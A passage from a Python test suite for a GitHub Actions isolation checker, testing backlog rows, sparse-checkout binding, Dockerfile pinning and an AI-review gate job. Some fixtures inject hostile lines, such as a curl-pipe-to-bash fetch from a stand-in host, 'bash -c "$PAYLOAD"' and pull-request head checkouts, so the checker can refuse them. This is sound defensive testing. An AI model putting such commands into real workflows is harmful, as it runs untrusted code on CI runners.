expect({**CANARY_HEAD, "pending.tsv": HEAD_PENDING}, 0,
       ("PENDING: runner-canary.yml [workflow_dispatch]: job 'canary'",),
       "a backlog row ratchets a known relayed job", "--pending", "{dir}/pending.tsv")
MOVED = backlog_relay("runner-canary.yml", "canary", SPARSE_HEAD, "[self-hosted, other]")
expect({**MOVED, "pending.tsv": HEAD_PENDING}, 1,
       ("pending row no longer applies: backlog digest changed",),
       "a backlog row stops applying when the selector changes", "--pending", "{dir}/pending.tsv")
OBSERVE_PLAIN = backlog_relay("capability-floor-observe.yml", "observe", "- run: echo maintenance")
OBSERVE_PLAIN_PENDING = backlog_row(OBSERVE_PLAIN, "capability-floor-observe.yml [workflow_dispatch]", "observe")
expect({**OBSERVE_PLAIN, "pending.tsv": OBSERVE_PLAIN_PENDING}, 0,
       ("PENDING: capability-floor-observe.yml [workflow_dispatch]: job 'observe'",),
       "a backlog row ratchets a known relayed job with no refusal", "--pending", "{dir}/pending.tsv")
expect_no_pending(
    {**backlog_relay("capability-floor-observe.yml", "observe", PROBES["workflow_dispatch"][0]),
     "pending.tsv": OBSERVE_PLAIN_PENDING},
    "a backlog job that gains a head-materializing checkout is refused, whatever its row says",
    (RELAY_REFUSAL, "a pending row cannot waive a refusal"),
    "--pending",
    "{dir}/pending.tsv",
)
expect({**backlog_relay("runner-canary.yml", "canary", SPARSE_HEAD, "ubuntu-24.04"),
        "pending.tsv": HEAD_PENDING},
       1, ("STALE PENDING: runner-canary.yml [workflow_dispatch]: job 'canary'",),
       "a backlog row for a job moved to a hosted runner is stale", "--pending", "{dir}/pending.tsv")
expect({**OBSERVE_PLAIN, "pending.tsv": OBSERVE_PLAIN_PENDING,
        "reviewed.tsv": review_row(OBSERVE_PLAIN, "capability-floor-observe.yml [workflow_dispatch]", "observe")},
       2, ("UNDETERMINED", "in both the pending and the reviewed list"),
       "a relayed job listed as both pending and reviewed is undetermined",
       "--pending", "{dir}/pending.tsv", *REVIEWED_ARGS)
# A pending row never ratchets a privileged (non-relay) finding.
FORK_JOB = relay_job("fork", PROBES["fork"][0])
expect({**FORK_JOB, "pending.tsv": "relay.yml [fork]\tj\t" + NO_SPARSE_RUNTIME + "\tbacklog\n"}, 2,
       ("UNDETERMINED", "relay.yml [fork] job 'j' is not in the frozen backlog"),
       "a pending row cannot stand in for a privileged-event review: no privileged key is in the frozen backlog",
       "--pending", "{dir}/pending.tsv")


# The live `gate` job's shape: gate-rearm.yml's pull_request_target run
# dispatches ai-review-merge.yml, whose gate checks out the target PR head at
# the workspace root and runs a review action there. With the ADR 0048 fast-lane
# selector a public target lands on CI_RUNNER_FASTLANE, the persistent pool; the
# ADR 0235 selector sends it to the ephemeral untrusted lane.
GATE_SHAPE = """
    on:
      workflow_dispatch:
        inputs:
          ai_review_environment:
            type: choice
            options: [ai-review-app]
          pr_number:
            required: true
          expected_head_sha:
            required: true
    env:
      PR_NUMBER: ${{ github.event.pull_request.number || inputs.pr_number }}
      TARGET_REPO: ${{ github.repository }}
    jobs:
      preflight:
        runs-on: ubuntu-24.04
        outputs:
          target_private: ${{ steps.visibility.outputs.target_private }}
          head_sha: ${{ inputs.expected_head_sha }}
        steps:
          - id: visibility
            run: echo "target_private=$(gh api "repos/$TARGET_REPO" --jq .private)" >>"$GITHUB_OUTPUT"
      gate:
        environment: ${{ inputs.ai_review_environment }}
        needs: preflight
        runs-on: SELECTOR
        steps:
          - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
            with:
              repository: ${{ env.TARGET_REPO }}
              ref: ${{ needs.preflight.outputs.head_sha }}
              fetch-depth: 2
          - uses: anthropics/claude-code-action@c81e3bc69d1b18badbb63ba39581218f02421678
"""
FAST_LANE_SELECTOR = (
    "${{ inputs.runner_labels && fromJSON(inputs.runner_labels) || github.repository_owner != 'Verjson' "
    "&& 'ubuntu-24.04' || needs.preflight.outputs.target_private == 'false' && fromJSON(vars.CI_RUNNER_FASTLANE "
    "|| '[\"ubuntu-24.04\"]') || fromJSON(vars.CI_RUNNER_OVERFLOW || vars.CI_LANE_TRUSTED || vars.CI_LANE_FALLBACK "
    "|| '[\"ubuntu-24.04\"]') }}"
)
UNTRUSTED_LANE_SELECTOR = (
    "${{ (github.repository_owner != 'Verjson' || github.event.repository.private == true) && inputs.runner_labels "
    "&& fromJSON(inputs.runner_labels) || github.repository_owner != 'Verjson' && 'ubuntu-24.04' || "
    "github.event.repository.private == true && needs.preflight.outputs.target_private != 'false' && "
    "fromJSON(vars.CI_RUNNER_OVERFLOW || vars.CI_LANE_TRUSTED || vars.CI_LANE_FALLBACK || '[\"ubuntu-24.04\"]') "
    "|| fromJSON(vars.CI_LANE_UNTRUSTED || '[\"ubuntu-24.04\"]') }}"
)
expect(
    {"ai-review-merge.yml": GATE_SHAPE.replace("SELECTOR", FAST_LANE_SELECTOR)},
    1,
    ("VIOLATION: ai-review-merge.yml [workflow_dispatch]: job 'gate'", RELAY_REFUSAL, HEAD_DIAG),
    "the live gate shape on the ADR 0048 fast lane is refused (before the ADR 0235 fix)",
)
expect(
    {"ai-review-merge.yml": GATE_SHAPE.replace("SELECTOR", UNTRUSTED_LANE_SELECTOR)},
    0,
    ("clean",),
    "the live gate shape on the ADR 0235 selector is clean (after the fix)",
)
# Honoring a Verjson caller's runner_labels for a public repository would let
# a pull request that edits the caller name the pool again.
expect(
    {"ai-review-merge.yml": GATE_SHAPE.replace("SELECTOR", UNTRUSTED_LANE_SELECTOR.replace(
        "(github.repository_owner != 'Verjson' || github.event.repository.private == true) && ", "")
    ).replace("          expected_head_sha:\n", "          runner_labels:\n            required: false\n"
              "          expected_head_sha:\n")},
    1,
    ("VIOLATION: ai-review-merge.yml [workflow_dispatch]: job 'gate'", RELAY_REFUSAL),
    "an unguarded runner_labels input reopens the pool for the gate shape",
)


# ---------------------------------------------------------------------------
# Round-4 review of #1827: the relay backlog waived content. A pending row
# keyed to selector and reason names let a backlog job change anything else,
# and it was consulted before refusals, so a matching row waived a refusal no
# entry may accept. The fixtures below use real backlog keys, because the
# backlog is frozen in code and a fixture key outside it fails for that reason.
# ---------------------------------------------------------------------------
UNPINNED_OBSERVE = backlog_fixture("- run: echo observe", "container: alpine:3")
expect_no_pending(
    {**UNPINNED_OBSERVE,
     "pending.tsv": backlog_row(UNPINNED_OBSERVE, "capability-floor-observe.yml [workflow_dispatch]", "observe")},
    "a matching backlog row cannot waive a refusal: an unpinned job image still fails",
    ("VIOLATION: capability-floor-observe.yml [workflow_dispatch]: job 'observe'",
     "must be pinned by an @sha256: digest"),
    *PENDING_ARGS,
)

# The backlog may only shrink: a pending row for any key outside the frozen
# set is refused before a single job is scanned, even with the exact digest
# the checker names for it.
expect(
    {**DISPATCH_PLAIN, "pending.tsv": backlog_row(DISPATCH_PLAIN, "relay.yml [workflow_dispatch]", "j")},
    2,
    ("UNDETERMINED", "relay.yml [workflow_dispatch]", "not in the frozen backlog"),
    "a pending row for a key outside the frozen backlog is refused: the backlog cannot grow",
    *PENDING_ARGS,
)

# A backlog row binds the job's full content, not its selector and reason
# names: an edit that keeps both (here, a different command) stops the row
# applying, so the backlog cannot carry a job that changed after it froze.
expect_no_pending(
    {**backlog_relay("capability-floor-observe.yml", "observe", "- run: bash -c \"$PAYLOAD\""),
     "pending.tsv": OBSERVE_PLAIN_PENDING},
    "a backlog row stops applying when the job's content changes under the same selector and reasons",
    ("VIOLATION: capability-floor-observe.yml [workflow_dispatch]: job 'observe'", "pending row no longer applies"),
    *PENDING_ARGS,
)
expect_no_pending(
    {**{name: re.sub(r"(?m)^( *)jobs:$", r"\1env:\n\1  PAYLOAD: ${{ inputs.payload }}\n\1jobs:", body)
        for name, body in OBSERVE_PLAIN.items()},
     "pending.tsv": OBSERVE_PLAIN_PENDING},
    "a backlog row stops applying when the job's inherited workflow settings change",
    ("VIOLATION: capability-floor-observe.yml [workflow_dispatch]: job 'observe'", "pending row no longer applies"),
    *PENDING_ARGS,
)

# A local action is the job's own steps, so its bytes bind the backlog row too.
ACTION_OBSERVE = {
    **backlog_relay("capability-floor-observe.yml", "observe", "- uses: ./.github/actions/observe"),
    ".github/actions/observe/action.yml": """
        runs:
          using: composite
          steps:
            - run: echo observe
              shell: bash
    """,
}
expect_no_pending(
    {**ACTION_OBSERVE,
     ".github/actions/observe/action.yml": ACTION_OBSERVE[".github/actions/observe/action.yml"].replace(
         "echo observe", "bash -c \"$PAYLOAD\""),
     "pending.tsv": backlog_row(ACTION_OBSERVE, "capability-floor-observe.yml [workflow_dispatch]", "observe")},
    "a backlog row stops applying when a local action the job runs changes",
    ("VIOLATION: capability-floor-observe.yml [workflow_dispatch]: job 'observe'", "pending row no longer applies"),
    *PENDING_ARGS,
)

# The tolerated refusal kinds shrink with the job: a backlog job that no
# longer carries one fails until RELAY_BACKLOG drops it.
CANARY_PLAIN = backlog_relay("runner-canary.yml", "canary", "- run: echo canary")
expect(
    {**CANARY_PLAIN,
     "pending.tsv": backlog_row(CANARY_PLAIN, "runner-canary.yml [workflow_dispatch]", "canary")},
    1,
    ("STALE BACKLOG: runner-canary.yml [workflow_dispatch]: job 'canary' no longer carries refusal kind relay-head",),
    "a backlog key that tolerates a refusal kind the job no longer carries is stale",
    *PENDING_ARGS,
)

# Tolerance comes only with the job's own pending row: a frozen key that has
# left the pending list keeps no refusal kind, and no reviewed entry stands in.
# Refusals are decided before the entry's digest is compared, so any digest
# serves.
expect_no_pending(
    with_review(
        CANARY_HEAD,
        f"runner-canary.yml [workflow_dispatch]\tcanary\tsha256:{'e' * 64}"
        "\treviewed\tdynamic: head-materialization: claims the ref is safe\n",
    ),
    "a frozen backlog job without its pending row tolerates no refusal, even with a reviewed entry",
    ("VIOLATION: runner-canary.yml [workflow_dispatch]: job 'canary'", RELAY_REFUSAL),
    *REVIEWED_ARGS,
)

# ---------------------------------------------------------------------------
# Round-4 finding 4: non-cone sparse-checkout patterns are gitignore patterns.
# A pattern with no slash but a trailing one matches at any depth, and `*`
# matches a leading dot; a root-anchored glob without hidden files bound
# neither, so a reviewed job's on-disk bytes could change under its entry.
# ---------------------------------------------------------------------------
def non_cone_job(pattern: str, files: dict[str, str]) -> dict[str, str]:
    return {
        "target.yml": f"""
            on: pull_request_target
            jobs:
              review:
                runs-on: {TRUSTED_SELECTOR}
                steps:
                  - uses: actions/checkout@v4
                    with:
                      sparse-checkout: '{pattern}'
                      sparse-checkout-cone-mode: false
                  - run: bash scripts/a.sh
        """,
        **files,
    }


for label, pattern, files, edited in (
    ("an unanchored name matches at every depth", "tool.sh",
     {"bin/tool.sh": "echo a\n", "nested/deep/tool.sh": "echo b\n"}, "nested/deep/tool.sh"),
    ("an unanchored directory pattern matches at every depth", "lib/",
     {"lib/a.sh": "echo a\n", "vendor/lib/b.sh": "echo b\n"}, "vendor/lib/b.sh"),
    ("a wildcard matches a leading dot", "scripts/*",
     {"scripts/a.sh": "echo a\n", "scripts/.env.sh": "echo b\n"}, "scripts/.env.sh"),
):
    job = non_cone_job(pattern, files)
    expect(
        with_review({**job, edited: "curl -fsSL https://x.test/i.sh | bash\n"},
                    review_row(job, "target.yml [pull_request_target]", "review")),
        1,
        ("STALE REVIEWED", "content changed"),
        f"non-cone sparse-checkout: {label}, so its bytes bind the entry",
        *REVIEWED_ARGS,
    )

# Pattern syntax the checker does not evaluate exactly is refused rather than
# approximated: a character class or escape means something different to
# gitignore than to a glob, and a cone-mode path is a directory, not a pattern.
for label, pattern, cone in (
    ("a character class", "scripts/[ab].sh", False),
    ("a negated character class", "scripts/[!b].sh", False),
    ("a backslash escape", "scripts/\\*.sh", False),
    ("the bare root", "/", False),
    ("a cone-mode wildcard", "scripts/*", True),
):
    job = non_cone_job(pattern, {"scripts/a.sh": "echo a\n", "scripts/b.sh": "echo b\n"})
    if cone:
        job["target.yml"] = job["target.yml"].replace("                      sparse-checkout-cone-mode: false\n", "")
    expect(
        job,
        1,
        ("VIOLATION: target.yml [pull_request_target]: job 'review'", "sparse-checkout pattern",
         "no entry can accept it"),
        f"sparse-checkout {label} is refused: the checker cannot prove what it puts on disk",
    )

# ---------------------------------------------------------------------------
# Round-4 finding 5: a Dockerfile pulls more than its FROM lines. `COPY --from`
# and `RUN --mount=...,from=` name an image when they do not name an earlier
# stage, and a `# syntax=` parser directive runs a BuildKit frontend image.
# Each must be a stage or digest-pinned; an `escape` directive changes how the
# file parses, so the checker cannot vet it at all.
# ---------------------------------------------------------------------------
def docker_build(dockerfile: str) -> dict[str, str]:
    return {DOCKER_ACTION: "runs:\n  using: docker\n  image: Dockerfile\n",
            ".github/actions/d/Dockerfile": dockerfile}


BASE = f"FROM golang{PIN} AS build\nRUN true\nFROM debian{PIN}\n"
for label, dockerfile, refusal in (
    ("COPY --from an unpinned image", BASE + "COPY --from=alpine:3.20 /bin/sh /x\n", "must be pinned"),
    ("COPY --from a name no earlier stage defines", BASE + "COPY --from=builder /x /x\n", "must be pinned"),
    ("COPY --from on a continuation line", BASE + "COPY \\\n  --from=alpine /x /x\n", "must be pinned"),
    ("a lowercase copy --from", BASE + "copy --from=alpine /x /x\n", "must be pinned"),
    ("COPY --from an expression", BASE + "COPY --from=${IMAGE} /x /x\n", "must be pinned"),
    ("COPY --from a stage index not yet defined", BASE + "COPY --from=2 /x /x\n", "must be pinned"),
    ("RUN --mount from an unpinned image", BASE + "RUN --mount=type=bind,from=alpine:3.20,target=/m true\n",
     "must be pinned"),
    ("RUN --mount cache from an unpinned image", BASE + "RUN --mount=type=cache,target=/c,from=busybox true\n",
     "must be pinned"),
    ("an unpinned # syntax frontend", "# syntax=docker/dockerfile:1\n" + BASE, "must be pinned"),
    ("a spaced # syntax frontend", "#   syntax = docker/dockerfile:1.7\n" + BASE, "must be pinned"),
    ("an escape parser directive", "# escape=`\n" + BASE, "parser directive"),
    ("COPY --from a stage defined later", f"FROM debian{PIN}\nCOPY --from=late /x /x\nFROM golang{PIN} AS late\n",
     "must be pinned"),
):
    code, output = run_checker(shaped_job("- uses: ./.github/actions/d", docker_build(dockerfile)))
    if code == 1 and "VIOLATION" in output and refusal in output and "no entry can accept it" in output:
        ok(f"a local docker action with {label} is refused")
    else:
        fail(f"a local docker action with {label} should be refused (got {code}: {output.strip()[:400]})")
for label, dockerfile in (
    ("COPY --from an earlier stage", BASE + "COPY --from=build /x /x\n"),
    ("COPY --from an earlier stage index", BASE + "COPY --from=0 /x /x\n"),
    ("COPY --from a pinned image", BASE + f"COPY --from=alpine{PIN} /x /x\n"),
    ("RUN --mount from an earlier stage", BASE + "RUN --mount=type=bind,from=build,target=/m true\n"),
    ("RUN --mount with no from", BASE + "RUN --mount=type=secret,id=token true\n"),
    ("a pinned # syntax frontend", f"# syntax=docker/dockerfile:1{PIN}\n" + BASE),
    ("a comment that is not a directive", BASE + "# copy --from=alpine is documented here\n"),
    ("a command argument that looks like a flag", BASE + "RUN tool --from=alpine --mount=from=busybox\n"),
):
    code, output = run_checker(shaped_job("- uses: ./.github/actions/d", docker_build(dockerfile)))
    if code == 1 and REVIEW_REQUIRED in output and "must be pinned" not in output and "parser directive" not in output:
        ok(f"a local docker action with {label} needs only a reviewed entry")
    else:
        fail(f"a local docker action with {label} should be reviewable (got {code}: {output.strip()[:400]})")

# The relay backlog as frozen at the round-4 review of #1827. The checker's
# set may only shrink against this snapshot: a key, or a refusal kind a key
# tolerates, that is not here fails. Never add to it. When a job leaves the
# backlog, remove it from the checker, the pending list, and here in the same
# change, so a removed key cannot quietly return. The five pull_request keys
# frozen alongside it have already left (finding 6).
SNAPSHOT_RELAY_BACKLOG = {
    ('actionlint.yml [workflow_call]', 'actionlint'): frozenset({'relay-head'}),
    ('ai-promotion-retry.yml [workflow_call]', 'resolve'): frozenset({'relay-head'}),
    ('capability-floor-observe.yml [workflow_dispatch]', 'observe'): frozenset(),
    ('changelog-release.yml [workflow_call]', 'release'): frozenset({'relay-head', 'runtime-checkout'}),
    ('changelog-validate.yml [workflow_call]', 'validate'): frozenset({'relay-head', 'runtime-checkout'}),
    ('container-candidate.yml [workflow_call]', 'prepare'): frozenset({'relay-head'}),
    ('container-candidate.yml [workflow_call]', 'pull-request-build'): frozenset(),
    ('container-candidate.yml [workflow_call]', 'skip-private-node-build'): frozenset(),
    ('container-deployment-review-producer.yml [workflow_call]', 'analyze'):
        frozenset({'relay-head', 'runtime-checkout'}),
    ('container-deployment-review-producer.yml [workflow_call]', 'environment-preflight'): frozenset(),
    ('container-deployment-review-producer.yml [workflow_call]', 'publish-ai'):
        frozenset({'relay-head', 'runtime-checkout'}),
    ('container-deployment-review-producer.yml [workflow_call]', 'publish-code'):
        frozenset({'relay-head', 'runtime-checkout'}),
    ('container-deployment-review-producer.yml [workflow_call]', 'publish-security'):
        frozenset({'relay-head', 'runtime-checkout'}),
    ('container-deployment.yml [workflow_call]', 'deploy'): frozenset({'relay-head'}),
    ('container-deployment.yml [workflow_call]', 'dry-run'): frozenset({'relay-head'}),
    ('container-release-workflow-ref-canary.yml [workflow_dispatch]:probe -> container-release.yml', 'retention'):
        frozenset({'relay-head', 'runtime-checkout'}),
    ('container-release.yml [workflow_call]', 'retention'): frozenset({'relay-head', 'runtime-checkout'}),
    ('dependency-supersession-observe.yml [workflow_dispatch]', 'observe'): frozenset({'relay-head'}),
    ('dependency-supersession-reconcile.yml [workflow_dispatch]', 'reconcile'): frozenset(),
    ('generated-artifacts.yml [workflow_call]', 'validate'): frozenset({'relay-head', 'runtime-checkout'}),
    ('helm-ci.yml [workflow_call]', 'lint-template'): frozenset({'relay-head'}),
    ('node-ci-protected.yml [workflow_call]', 'build-test'): frozenset({'relay-head', 'runtime-checkout'}),
    ('node-ci-protected.yml [workflow_call]', 'eligibility'): frozenset(),
    ('node-ci.yml [workflow_call]', 'build-test'): frozenset({'relay-head'}),
    ('node-ci.yml [workflow_call]', 'eligibility'): frozenset(),
    ('notify-umbrella.yml [workflow_call]', 'dispatch'): frozenset(),
    ('pulumi-ci.yml [workflow_call]', 'preview'): frozenset({'relay-head'}),
    ('pulumi-ci.yml [workflow_call]', 'preview-admission'): frozenset(),
    ('pulumi-ci.yml [workflow_call]', 'validate'): frozenset({'relay-head'}),
    ('release-app-canary.yml [workflow_dispatch]', 'canary'): frozenset(),
    ('release-dispatch.yml [workflow_call]', 'release-dispatch'): frozenset({'relay-head', 'runtime-checkout'}),
    ('release-propose.yml [workflow_call]', 'release-propose'): frozenset({'relay-head', 'runtime-checkout'}),
    ('release.yml [workflow_dispatch]', 'publish'): frozenset(),
    ('release.yml [workflow_dispatch]', 'snapshot'): frozenset(),
    ('release.yml [workflow_dispatch]', 'verify'): frozenset({'full-checkout', 'relay-head', 'runtime-checkout'}),
    ('renovate-changelog.yml [workflow_call]', 'attribute'): frozenset({'relay-head', 'runtime-checkout'}),
    ('renovate-compatibility-canary.yml [workflow_call]', 'receipt'): frozenset(),
    ('renovate-compatibility-reconcile.yml [workflow_dispatch]', 'observe'): frozenset(),
    ('renovate-grouping-plan.yml [workflow_dispatch]', 'plan'): frozenset({'relay-head', 'runtime-checkout'}),
    ('repo-hygiene.yml [workflow_call]', 'hygiene'): frozenset({'relay-head', 'runtime-checkout'}),
    ('rework-reconcile.yml [workflow_dispatch]', 'reconcile'): frozenset(),
    ('runner-canary.yml [workflow_dispatch]', 'canary'): frozenset({'relay-head'}),
    ('ui-ci.yml [workflow_call]', 'build-test'): frozenset({'relay-head'}),
    ('verjson-ci.yml [workflow_call]', 'ci'): frozenset(),
}


def load_checker():
    spec = importlib.util.spec_from_file_location("public_pr_runner_isolation", SCRIPT)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


CHECKER = load_checker()
grown = sorted(set(CHECKER.RELAY_BACKLOG) - set(SNAPSHOT_RELAY_BACKLOG))
widened = sorted(
    (key, sorted(kinds - SNAPSHOT_RELAY_BACKLOG[key]))
    for key, kinds in CHECKER.RELAY_BACKLOG.items()
    if key in SNAPSHOT_RELAY_BACKLOG and kinds - SNAPSHOT_RELAY_BACKLOG[key]
)
if grown or widened:
    fail(f"the frozen backlog may only shrink (added keys {grown}, added refusal kinds {widened})")
else:
    ok("the frozen backlog is a subset of the round-4 snapshot: it may only shrink")
unmirrored = sorted(
    key for key in SNAPSHOT_RELAY_BACKLOG
    if key not in CHECKER.RELAY_BACKLOG or CHECKER.RELAY_BACKLOG[key] != SNAPSHOT_RELAY_BACKLOG[key]
)
if unmirrored:
    fail(f"the snapshot still holds what the checker dropped, so it could return unseen: {unmirrored}")
else:
    ok("the snapshot mirrors the checker: a key that leaves cannot quietly return")
RELAY_LABEL = re.compile(r"^[^ ]+ \[(?:workflow_dispatch|workflow_call|repository_dispatch)\](?::| |$)")
misfiled = sorted(key for key in CHECKER.RELAY_BACKLOG if not RELAY_LABEL.match(key[0]))
if hasattr(CHECKER, "PULL_REQUEST_BACKLOG"):
    misfiled.append(("PULL_REQUEST_BACKLOG", "a pull_request backlog exists again"))
FULL_CHECKOUT_KEYS = sorted(key for key, kinds in CHECKER.RELAY_BACKLOG.items() if "full-checkout" in kinds)
if FULL_CHECKOUT_KEYS != [("release.yml [workflow_dispatch]", "verify")]:
    fail(f"full-checkout is tolerated by exactly release.yml verify, not {FULL_CHECKOUT_KEYS}")
else:
    ok("full-checkout is tolerated by exactly one key, release.yml verify (Part of #1831)")
if misfiled:
    fail(f"a frozen backlog key names an event outside its set: {misfiled}")
else:
    ok("every backlog key is a relay-event label, and no pull_request backlog exists")
LIVE_PENDING = set(CHECKER.load_pending(os.path.join(HERE, "public-pr-runner-isolation.pending.tsv")))
FROZEN = set(CHECKER.RELAY_BACKLOG)
if LIVE_PENDING != FROZEN:
    fail(f"the pending list and the frozen backlog differ: only listed {sorted(LIVE_PENDING - FROZEN)}, "
         f"only frozen {sorted(FROZEN - LIVE_PENDING)}; remove a fixed job from both")
else:
    ok("the live pending list names exactly the frozen backlog")

# Round-4 finding 6: #1826 has landed, so the five pull_request rows that
# waited on it are stale. The live tree must be clean with only the relay
# backlog listed: no pull_request job may reach a persistent runner at all.
# The checker runs with the live lists in place: their own bytes are excluded
# from every digest only at their real paths, so a filtered copy elsewhere would
# bind the in-tree list like any other file.
LIVE_PENDING_PATH = os.path.join(HERE, "public-pr-runner-isolation.pending.tsv")
with open(LIVE_PENDING_PATH, encoding="utf-8") as handle:
    non_relay = [row.split("\t")[0] for row in handle.read().splitlines()
                 if row.strip() and not row.startswith("#") and not RELAY_LABEL.match(row.split("\t")[0])]
completed = subprocess.run(
    [sys.executable, SCRIPT, "--pending", LIVE_PENDING_PATH, "--reviewed",
     os.path.join(HERE, "public-pr-runner-isolation.reviewed.tsv"),
     os.path.join(os.path.dirname(os.path.dirname(HERE)), ".github", "workflows")],
    capture_output=True,
    text=True,
    cwd=os.path.dirname(os.path.dirname(HERE)),
)
if non_relay:
    fail(f"the live pending list names non-relay rows: {non_relay}")
if completed.returncode == 0:
    ok("the live tree is clean with no pull_request row: every pull_request job is on an ephemeral runner")
else:
    fail("a live pull_request job still needs a pending row: "
         + "; ".join(line for line in completed.stdout.splitlines() if line.startswith("VIOLATION"))[:600])

# ---------------------------------------------------------------------------
# Round-5 review of #1827: a pending row still applied after the job's runtime
# behavior changed. Head detection never read a program run by a bare
# relative path (`scripts/x.sh`), and the backlog digest bound neither the
# bytes a sparse checkout puts on disk nor the programs a full-checkout job
# runs. These fixtures copy the live rework-reconcile job and script.
# ---------------------------------------------------------------------------
REPO_ROOT = os.path.dirname(os.path.dirname(HERE))


def live(path: str) -> str:
    with open(os.path.join(REPO_ROOT, path), encoding="utf-8") as handle:
        return handle.read()


REWORK = {
    "rework-reconcile.yml": live(".github/workflows/rework-reconcile.yml"),
    **{path: live(path) for path in (
        "scripts/ci-telemetry/rework-reconcile.sh",
        "scripts/ci-telemetry/rework-classify.sh",
        "scripts/ci-telemetry/rework-aggregate.sh",
        ".telemetry/rework-thresholds.json",
    )},
}
REWORK_LABEL = ("rework-reconcile.yml [workflow_dispatch]", "reconcile")
REWORK_PENDING = backlog_row(REWORK, *REWORK_LABEL)
expect({**REWORK, "pending.tsv": REWORK_PENDING}, 0,
       ("PENDING: rework-reconcile.yml [workflow_dispatch]: job 'reconcile'",),
       "the live rework-reconcile job is ratcheted by its own backlog row", *PENDING_ARGS)
expect_no_pending(
    {**REWORK, "pending.tsv": REWORK_PENDING,
     "scripts/ci-telemetry/rework-reconcile.sh": REWORK["scripts/ci-telemetry/rework-reconcile.sh"]
     + 'gh pr checkout "$PR"\ngit fetch origin "refs/pull/$PR/head" && git checkout FETCH_HEAD\n'},
    "round-5 repro: a backlog job's bare-path script that starts checking out a pull request head is refused",
    ("VIOLATION: rework-reconcile.yml [workflow_dispatch]: job 'reconcile'", RELAY_REFUSAL),
    *PENDING_ARGS,
)
expect_no_pending(
    {**REWORK, "pending.tsv": REWORK_PENDING,
     "scripts/ci-telemetry/rework-reconcile.sh": REWORK["scripts/ci-telemetry/rework-reconcile.sh"]
     + 'printf "%s\\n" "${EXTRA:-}" >>"$GITHUB_STEP_SUMMARY"\n'},
    "a backlog row stops applying when any file the job's sparse checkout holds changes",
    ("VIOLATION: rework-reconcile.yml [workflow_dispatch]: job 'reconcile'", "pending row no longer applies"),
    *PENDING_ARGS,
)

# Head detection follows a bare relative path in any command position: after
# `&&`, after `;`, inside `$( )`, and behind an assignment prefix.
SPARSE_TOOLS = "- uses: actions/checkout@v4\n  with:\n    sparse-checkout: tools/*\n    sparse-checkout-cone-mode: false\n"
BARE_STEPS = {
    "line start": "- run: tools/observe.sh --weekly",
    "after &&": "- run: cd . && tools/observe.sh --weekly",
    "after ;": "- run: true; tools/observe.sh --weekly",
    "inside $( )": '- run: echo "$(tools/observe.sh --weekly)"',
    "after an assignment": "- run: MODE=weekly tools/observe.sh",
}
for label, step in BARE_STEPS.items():
    job = {**backlog_relay("capability-floor-observe.yml", "observe", SPARSE_TOOLS + step),
           "tools/observe.sh": "echo observe\n"}
    expect_no_pending(
        {**job, "pending.tsv": backlog_row(job, "capability-floor-observe.yml [workflow_dispatch]", "observe"),
         "tools/observe.sh": "gh pr checkout \"$PR\"\n"},
        f"a bare relative program ({label}) that starts checking out a head is refused",
        (RELAY_REFUSAL,),
        *PENDING_ARGS,
    )
# Every file the sparse checkout holds binds the row, so a script two calls
# deep is bound by its bytes, not by following the call.
NESTED = {
    **backlog_relay("capability-floor-observe.yml", "observe", SPARSE_TOOLS + "- run: bash tools/outer.sh"),
    "tools/outer.sh": "#!/usr/bin/env bash\n\"$(dirname \"$0\")/inner.sh\" --weekly\n",
    "tools/inner.sh": "echo inner\n",
}
NESTED_ROW = backlog_row(NESTED, "capability-floor-observe.yml [workflow_dispatch]", "observe")
expect_no_pending(
    {**NESTED, "tools/inner.sh": "echo inner changed\n", "pending.tsv": NESTED_ROW},
    "a backlog row stops applying when a script reached only through a variable changes",
    ("pending row no longer applies",),
    *PENDING_ARGS,
)
# A command word that is not a tracked file is not a program to follow, so a
# step naming a head value beside it is not made undetermined by it.
UNTRACKED_WORD = backlog_relay(
    "capability-floor-observe.yml", "observe",
    "- uses: actions/checkout@v4\n- run: node_modules/.bin/tool \"$SHA\"\n"
    "  env:\n    SHA: ${{ github.event.pull_request.head.sha }}",
)
code, output = run_checker(UNTRACKED_WORD)
if code == 1 and REVIEW_REQUIRED in output and RELAY_REFUSAL not in output and "cannot read" not in output:
    ok("a bare command word that is not a tracked file is not followed, even beside a head value")
else:
    fail(f"a bare untracked command word was followed as a program (got {code}: {output.strip()[:400]})")

# A sparse checkout's bytes bind the backlog row, except the pending and
# reviewed lists themselves, which a checkout of their directory holds.
SPARSE_OBSERVE = {
    **backlog_relay("capability-floor-observe.yml", "observe",
                    "- uses: actions/checkout@v4\n  with:\n    sparse-checkout: config\n- run: echo observe"),
    "config/policy.json": '{"allow": false}\n',
}
SPARSE_PENDING = backlog_row(SPARSE_OBSERVE, "capability-floor-observe.yml [workflow_dispatch]", "observe")
expect_no_pending(
    {**SPARSE_OBSERVE, "config/policy.json": '{"allow": true}\n', "pending.tsv": SPARSE_PENDING},
    "a backlog row stops applying when a file its sparse checkout puts on disk changes",
    ("pending row no longer applies",),
    *PENDING_ARGS,
)
LISTS_OBSERVE = backlog_relay(
    "capability-floor-observe.yml", "observe",
    "- uses: actions/checkout@v4\n  with:\n    sparse-checkout: .github/workflows\n- run: echo observe",
)
LISTS_ROW = backlog_row(LISTS_OBSERVE, "capability-floor-observe.yml [workflow_dispatch]", "observe")
expect({**LISTS_OBSERVE, "pending.tsv": LISTS_ROW}, 0,
       ("PENDING: capability-floor-observe.yml [workflow_dispatch]: job 'observe'",),
       "a backlog row whose checkout holds the pending list still matches its own row", *PENDING_ARGS)

# Round-5 should-fix (M1c): tolerance is the key's own frozen kinds, never a
# kind another key carries. runner-canary's `canary` froze with only
# relay-head; a head checkout with no sparse list adds a runtime-checkout
# refusal, which fails with its own matching pending row in place.
CANARY_UNBOUNDED = backlog_relay("runner-canary.yml", "canary", PROBES["workflow_dispatch"][0])
expect_no_pending(
    {**CANARY_UNBOUNDED,
     "pending.tsv": backlog_row(CANARY_UNBOUNDED, "runner-canary.yml [workflow_dispatch]", "canary")},
    "a refusal kind outside the key's frozen set fails even with a matching pending row",
    ("VIOLATION: runner-canary.yml [workflow_dispatch]: job 'canary'", "has no sparse-checkout list",
     "a pending row cannot waive a refusal"),
    *PENDING_ARGS,
)

# ---------------------------------------------------------------------------
# Round-6 review of #1827: bind what is on disk, not what the parser
# recognizes. A backlog row cannot bind a full checkout of the scanned tree
# (imports, shell functions, data files, and variables all reach bytes no
# command pattern names), so a backlog job that full-checkouts this tree, or
# materializes tracked content with git show/archive/cat-file, is refused
# whatever its frozen kinds; an exact non-cone sparse checkout is bound byte
